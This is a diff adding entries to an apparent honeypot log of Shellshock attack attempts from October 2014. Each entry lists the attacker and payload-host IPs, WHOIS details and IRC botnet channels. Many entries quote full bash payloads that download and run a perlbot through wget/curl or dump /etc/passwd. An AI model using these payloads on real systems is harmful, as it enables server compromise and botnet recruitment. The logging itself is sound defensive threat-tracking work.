@@ -502,3 +502,223 @@ NSLookup: NA
 WHOIS: NA
 Notes:
 - dprirc.sytes.net appears to no longer exist or is actively being filtered.
+
+#10/1/14
+
+Pitcher: 142.4.215.115
+Catcher: 89.33.193.10
+NSlookup (pitcher): web21.qna.vengit.com
+NSlookup (catcher): kiprosmarket.in
+WHOIS (pitcher):
+142.4.192.0/19
+OVH Hosting, Inc.
+CA
+abuse@ovh.ca
+AS16276
+WHOIS (catcher):
+89.33.193.0/24
+FIBER-UPLOAD-SRL
+RO
+abuse@ip.ro
+Payload: User-Agent: () { :;}; /bin/bash -c "cd /tmp;wget http://89.33.193.10/ji;curl -O /tmp/ji http://89.33.193.10/ji ; perl /tmp/ji;rm -rf /tmp/ji"
+Description: perlbot
+Server: ircd.w3h.co.uk
+Channel: #gnu
+Port: 443
+NSlookup: 68.235.41.115
+WHOIS: 
+68.235.40.0/22
+WIRESPEEDBACKPLANELLC
+US
+abuse@tzulo.com
+AS27524, AS30058, AS11878
+Notes:
+
+#10/3/14
+
+Pitcher: 88.119.196.88
+Catcher: NA
+Nslookup (pitcher): ns2.kaifas.lt
+WHOIS (pitcher):
+88.119.192.0/18
+LT-TELEKOMAS
+LT
+abuse@zebra.lt
+AS8764
+NSlookup (catcher): NA
+WHOIS (catcher): NA
+Payload: User-Agent: () { :;}; echo "Bagbash: " $(</etc/passwd)
+Description: /etc/passwd grabber
+Server: NA
+Port: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+- A simple touch that returns the contents of /etc/passwd if successful.
+- Saw 78.60.1.101 throwing a very similar Payload, with the echo statement being "BigBang: " instead of "Bagbash: "
+
+Pitcher: 174.143.168.121
+Catcher: ellrich.com
+Nslookup (pitcher): 174-143-168-121.static.cloud-ips.com
+WHOIS (pitcher):
+174.143.0.0/16
+Rackspace Hosting
+US
+abuse@rackspace.com
+AS33070, AS10532, AS19994, AS27357
+NSlookup (catcher): 208.70.184.145
+WHOIS (catcher):
+208.70.184.0/22
+Gallagher Construction
+US
+noc@macomp.com
+Payload: User-Agent: () { :;}; /bin/bash -c "wget ellrich.com/legend.txt -O /tmp/.apache;killall -9 perl;perl /tmp/.apache;rm -rf /tmp/.apache"
+Description: Perlbot
+Server: fantasy.legend.rocks
+Port: 7777
+Channel: #BASH
+NSlookup: 119.110.98.93
+WHOIS:
+119.110.98.0/24
+TM-VADS-DC
+MY
+abuse@netmyne.com
+AS17971
+Notes:
+-interesting comments on the perlbot.
+
+Pitcher: 54.64.179.8
+Catcher: NA
+Nslookup (pitcher): ec2-54-64-179-8.ap-northeast-1.compute.amazonaws.com
+WHOIS (pitcher):
+54.64.0.0/13
+AMAZON-2011L
+US
+ec2-abuse@amazon.com
+NSlookup (catcher): NA
+WHOIS (catcher): NA
+Payload: 
+Accept: () { :;};echo;echo "58b5"'f7cf'0ca7614e34a06a8b1d7f78b4;echo;exit
+User-Agent: () { :;};echo;echo "58b5"'f7cf'0ca7614e34a06a8b1d7f78b4;echo;exit
+Referer: () { :;};echo;echo "58b5"'f7cf'0ca7614e34a06a8b1d7f78b4;echo;exit
+Cookie: () { :;};echo;echo "58b5"'f7cf'0ca7614e34a06a8b1d7f78b4;echo;exit
+Description: vulnerability "touch"
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+
+Pitcher: 37.187.77.163
+Catcher: NA
+Nslookup (pitcher): ns3366463.ip-37-187-77.eu
+WHOIS (pitcher):
+37.187.0.0/16
+OVH
+abuse@ovh.net
+FR
+AS16276
+NSlookup (catcher): NA
+WHOIS (catcher): NA
+Payload: Cookie: () { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H; 
+User-Agent: () { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H; 
+Referer: () { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H; 
+Description: vulnerability "touch"
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+- Also being pitched from: 209.11.159.26, 54.213.225.160, 190.10.14.37, 192.3.138.103, 202.76.235.110, 50.193.119.109, 116.193.76.20, 184.107.246.98
+Pitcher: 186.91.253.210
+Catcher: best-home-based-business-idea.com
+Nslookup (pitcher): 186-91-253-210.genericrev.cantv.net
+WHOIS (pitcher):
+186.88.0.0/13
+CANTV.NET
+VE
+ipadmin@cantv.net
+AS8048
+NSlookup (catcher): 198.154.242.251
+WHOIS (catcher):
+198.154.192.0/18
+WEBSITEWELCOME.COM
+support@websitewelcome.com
+Payload: () { :;};echo 51en6adnoseis2jsyqvz$(curl 'http://best-home-based-business-idea.com/bash_count.php?%63%6F%6E%73%74%65%6C%6C%61%74%69%6F%6E%2E%63%6F%6D'; wget -qO- 'http://best-home-based-business-idea.com/bash_count.php?%63%6F%6E%73%74%65%6C%6C%61%74%69%6F%6E%2E%63%6F%6D';)51en6adnoseis2jsyqvz
+Description: vulnerability "touch"
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+- Also being pitched from: 200.90.86.95
+
+Pitcher: 211.154.173.239
+Catcher: 173.15.111.29
+Nslookup (pitcher):  173-15-111-29-Illinois.hfc.comcastbusiness.net
+WHOIS (pitcher):
+173.8.0.0/13
+Comcast Business Communications
+US
+abuse@comcast.net
+211.154.172.0 - 211.154.175.255
+BeiJing New-Billion Telecom Technology 
+CN
+ipas@cnnic.com
+NSlookup (catcher):
+WHOIS (catcher):
+Payload: User-Agent: () { :;}; /bin/bash -c "cd /tmp;wget https://173.15.111.29/user --no-check-certificate;curl -O https://173.15.111.29/user -k ; perl /tmp/user;rm -rf /tmp/user"
+Description: perlbot
+Server: bnics1.no-ip.org
+Port: 443
+Channel: #root
+NSlookup: 198.58.104.60
+WHOIS:
+198.58.96.0/19
+LINODE-US
+US
+abuse@linode.com
+Notes:
+- approx. 160 bots in this room at last check. no-ip resolved to that address on 10/3/14
+- the comcast address in question appears to be compromised. The SSL is self-signed by MITEL NETWORKS CORPORATION (www.mitel.com)
+- and the Cert mentions "Seigles.smtp.office365". Very likely a compromised business.
+- Found SeiglesCabinets
+
+Pitcher: 85.25.117.98
+Catcher: NA
+Nslookup (pitcher): triton326.server4you.de.
+WHOIS (pitcher): NA
+85.25.0.0/16
+PlusServer AG
+DE
+abuse@plusserver.de
+AS8972
+NSlookup (catcher): NA
+WHOIS (catcher): NA
+Payload: User-Agent: () { foo;};echo;/bin/cat /etc/passwd
+Description: user enum (/etc/passwd)
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+
+#Template. CHOOSE YOUR OWN ADVENTURE!
+Pitcher:
+Catcher:
+Nslookup (pitcher):
+WHOIS (pitcher):
+NSlookup (catcher):
+WHOIS (catcher):
+Payload:
+Description:
+Server:
+Port:
+Channel:
+NSlookup:
+WHOIS:
+Notes:
